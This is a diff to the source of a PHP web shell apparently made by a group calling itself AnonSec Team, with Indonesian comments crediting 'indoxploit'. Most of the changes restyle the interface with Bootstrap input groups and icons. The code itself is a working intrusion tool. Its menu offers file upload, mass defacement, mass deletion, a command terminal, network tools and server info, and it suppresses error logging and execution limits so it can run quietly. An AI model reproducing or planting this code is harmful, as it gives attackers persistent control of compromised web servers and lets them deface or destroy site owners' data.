@@ -1,11 +1,14 @@
 <?php
 /*	~ Gw doain kalo lu recode tytyd lu jadi kecil
-	~ untuk beberapa tools gw ambil dari indoxploit, karena tidak semuanya gw otakin sendiri. */
-header("X-XSS-Protection: 0");
-ob_start();
+	~ untuk beberapa tools gw ambil dari indoxploit, karena tidak semuanya gw otakin sendiri. 
+*/
 set_time_limit(0);
 error_reporting(0);
-ini_set('display_errors', FALSE);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
 
 function uns($dir,$ps) {
 if (isset($_GET['path'])) {
@@ -138,14 +141,14 @@ echo '
 			echo " [ ".uns($path, ps($path))." ]";
 			echo "
 			<div class='dropdown'>
-				<button class='btn btn-dark dropdown-toggle' type='button' id='dropdownMenuButton' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>Menu</button>
+				<button class='btn btn-dark dropdown-toggle' type='button' id='dropdownMenuButton' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'><i class='fas fa-server'></i> Menu</button>
 			<div class='dropdown-menu'>
 				<a class='dropdown-item' href='?path=$path&id=up'><i class='fas fa-upload'></i> Upload</a>
 				<a class='dropdown-item' href='?path=$path&id=df'><i class='fas fa-theater-masks'></i> Mass depes</a>
 				<a class='dropdown-item' href='?path=$path&id=dl'><i class='far fa-trash-alt'></i> Mass delete</a>
 				<a class='dropdown-item' href='?path=$path&id=nt'><i class='fas fa-network-wired'></i> Network</a>
 				<a class='dropdown-item' href='?path=$path&id=cm'><i class='fas fa-terminal'></i> Terminal</a>
-				<a class='dropdown-item' href='?path=$path&id=if'><i class='fas fa-info-circle'></i> Info</a>
+				<a class='dropdown-item' href='?path=$path&id=if'><i class='fas fa-info-circle'></i> Info server</a>
 				<a class='dropdown-item' href='?path=$path&id=ab'><i class='fas fa-info'></i> About</a></h5>
 				</div>
 			</div>
@@ -315,8 +318,9 @@ echo '<br /><style>table{display:none;}</style>
 <div class="container">
 	<div class="card text-dark">
 		<div class="card-header">';
-echo "<b>- About -</b><br />";
-echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email di bawah<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />My email: <a href='mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>";
+echo "<img class='img-thumbnail rounded mx-auto d-block' src='//unknownsec1337.github.io/AnonSec.jpg' width='150px'>";
+echo "<b>- About Me -</b><br />";
+echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email di bawah.<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />My email: <a href='mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>";
 	echo '</div>
 	</div>
 </div>';
@@ -324,7 +328,7 @@ echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email 
 elseif($_GET['id'] == 'cm') {
 	echo "<br /><style>table{display:none;}</style>
 <form method='post'>
-	<div class='input-group mb-3''>
+	<div class='input-group mb-3'>
 		<input type='text' class='form-control' name='cmd'>
 	<div class='input-group-append'>
 		<input class='btn btn-primary' type='submit' name='do_cmd' value='Go'>
@@ -407,10 +411,11 @@ echo "<br /><style>table{display:none;}</style>
 	<b><i class='far fa-folder'></i> Lokasi:</b>
 	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
 	<b><i class='far fa-file-alt'></i> File name:</b>
+	<div class='input-group mb-3'>
 	<input class='form-control' type='text' name='d_file' placeholder='name file' height='10'><br>
+	<div class='input-group-append'>
 	<input class='btn btn-primary btn-block' type='submit' name='start' value='Go'>
 </form>
-	</div>
 	</div>
 	</div>";
 		}
@@ -449,23 +454,31 @@ Swal.fire(
 }
 }
 echo '<form method="POST">
-<b>Permission :</b><input class="form-control" name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/>
+<b>Permission :</b>
+	<div class="input-group mb-3">
+<input class="form-control" name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/>
 	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
 		<input class="form-control" type="hidden" name="opt" value="chmod">
+		<div class="input-group-append">
 	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
-</form>
-<br />';
+	</form>
+	</div>
+</div>';
 }
 //rename folder
 elseif($_GET['opt'] == 'btw'){
 	$cwd = getcwd();
 	echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
-<b>New Name :</b><input class="form-control" name="name" type="text" size="25" value="Folder"/>
+<b>New Name :</b>
+	<div class="input-group mb-3">
+<input class="form-control" name="name" type="text" size="25" value="Folder"/>
 	<input class="form-control" type="hidden" name="path" value="'.$cwd.'">
 		<input class="form-control" type="hidden" name="opt" value="delete">
+		<div class="input-group-append">
 	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
-</form>
-<br />';
+	</form>
+	</div>
+</div>';
 }
 //rename file
 elseif($_POST['opt'] == 'rename'){
@@ -492,12 +505,16 @@ Swal.fire(
 $_POST['name'] = $_POST['newname'];
 }
 echo '<form method="POST">
-<b>New Name :</b><input class="form-control" name="newname" type="text" size="5" value="'.$_POST['name'].'" />
+<b>New Name :</b>
+	<div class="input-group mb-3">
+<input class="form-control" name="newname" type="text" size="5" value="'.$_POST['name'].'" />
 	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
 		<input class="form-control" type="hidden" name="opt" value="rename">
+		<div class="input-group-append">
 	<input class="btn btn-primary btn-block" type="submit" value="Go"/>
-</form>
-<br />';
+	</form>
+	</div>
+</div>';
 }
 //edit file
 elseif($_POST['opt'] == 'edit'){
@@ -605,19 +622,24 @@ elseif(!is_readable("$path/$dir")) echo '<font color="red">';
 	echo ps("$path/$dir");
 if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
 	echo "</center></td>
-<td><center><form method=\"POST\" action=\"?option&path=$path\">
+<td>
+<form method=\"POST\" action=\"?option&path=$path\">
+<div class='input-group mb-3 text-center'>
 	<select class=\"form-control\" name=\"opt\">
 		<option selected disabled>Select</option>
-			<option value=\"delete\">Delete</option>
+		<option value=\"delete\">Delete</option>
 		<option value=\"chmod\">Chmod</option>
-	<option value=\"rename\">Rename</option>
-</select>
-<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"dir\">
-	<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$dir\">
-			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+		<option value=\"rename\">Rename</option>
+	</select>
+<input type=\"hidden\" name=\"type\" value=\"dir\">
+	<input type=\"hidden\" name=\"name\" value=\"$dir\">
+			<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
+		<div class='input-group-append'>
 		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\"Go\"/>
 	</form>
-</center></td>
+	</div>
+</div>
+</td>
 </tr>";
 }
 foreach($scandir as $file){
@@ -632,52 +654,22 @@ foreach($scandir as $file){
 echo '<tr>
 		<td><i class="';
 	$ex = strtolower(pathinfo($file, PATHINFO_EXTENSION));
-	if($ex == "php") {
+	if($ex == "html" || $ex == "css" || $ex == "php" || $ex == "txt" || $ex == "js" || $ex == "sql" || $ex == "py" || $ex == "sh" || $ex == "pl" || $ex == "md" || $ex == "json" || $ex == "htm" || $ex == "ini") {
 		echo 'far fa-file-code';
-	}elseif($ex == "html"){
-		echo 'far fa-file-code';
-	}elseif($ex == "css"){
-		echo 'far fa-file-code';
-	}elseif($ex == "png"){
+	}elseif($ex == "png" || $ex == "jpg" || $ex == "jpeg" || $ex == "gif" || $ex == "ico"){
 		echo 'far fa-file-image';
-	}elseif($ex == "jpg"){
-		echo 'far fa-file-image';
-	}elseif($ex == "gif"){
-		echo 'far fa-file-image';
-	}elseif($ex == "jpeg"){
-		echo 'far fa-file-image';
-	}elseif($ex == "zip"){
+	}elseif($ex == "zip" || $ex == "rar"){
 		echo 'far fa-file-archive';
-	}elseif($ex == "rar"){
-		echo 'far fa-file-archive';
-	}elseif($ex == "js"){
-		echo 'far fa-file-code';
-	}elseif($ex == "txt"){
-		echo 'far fa-file-code';
-	}elseif($ex == "ico"){
-		echo 'far fa-file-image';
-	}elseif($ex == "htaccess"){
-		echo 'fas fa-code';
-	}elseif($ex == "sh"){
-		echo 'far fa-file-code';
-	}elseif($ex == "py"){
-		echo 'far fa-file-code';
-	}elseif($ex == "sql"){
-		echo 'far fa-file-code';
-	}elseif($ex == "pl"){
-		echo 'far fa-file-code';
 	}elseif($ex == "pdf"){
 		echo 'far fa-file-pdf';
+	}elseif($ex == "htaccess"){
+		echo 'fas fa-cogs';
 	}elseif($ex == "mp4"){
 		echo 'far fa-file-video';
 	}elseif($ex == "mp3"){
 		echo 'far fa-file-audio';
-	}elseif($ex == "excel"){
+	}elseif($ex == "excel" || $ex == "word"){
 		echo 'far fa-file-excel';
-	}elseif($ex == "word"){
-		echo 'far fa-file-word';
-	}elseif($ex == "md"){
-		echo 'far fa-file-code';
 	}else{
 		echo 'far fa-file-alt';
 	}
@@ -690,20 +682,25 @@ elseif(!is_readable("$path/$file")) echo '<font color="red">';
 	echo ps("$path/$file");
 if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
 	echo "</center></td>
-<td><center><form method=\"POST\" action=\"?option&path=$path\">
-	<select class=\"form-control\" name=\"opt\">
-		<option selected disabled>Select</option>
-			<option value=\"delete\">Delete</option>
+<td>
+<form method=\"POST\" action=\"?option&path=$path\">
+<div class='input-group mb-3 text-center'>
+<select class=\"form-control\" name=\"opt\">
+	<option selected disabled>Select</option>
+		<option value=\"delete\">Delete</option>
 		<option value=\"edit\">Edit</option>
-	<option value=\"rename\">Rename</option>
-<option value=\"chmod\">Chmod</option>
+		<option value=\"rename\">Rename</option>
+	<option value=\"chmod\">Chmod</option>
 </select>
-	<input class=\"form-control\" type=\"hidden\" name=\"type\" value=\"file\">
-		<input class=\"form-control\" type=\"hidden\" name=\"name\" value=\"$file\">
-			<input class=\"form-control\" type=\"hidden\" name=\"path\" value=\"$path/$file\">
+	<input type=\"hidden\" name=\"type\" value=\"file\">
+		<input type=\"hidden\" name=\"name\" value=\"$file\">
+			<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
+		<div class='input-group-append'>
 		<input class=\"btn btn-primary btn-block\" type=\"submit\" value=\"Go\"/>
 	</form>
-</center></td>
+	</div>
+</div>
+</td>
 </tr>";
 }
 echo '</table>
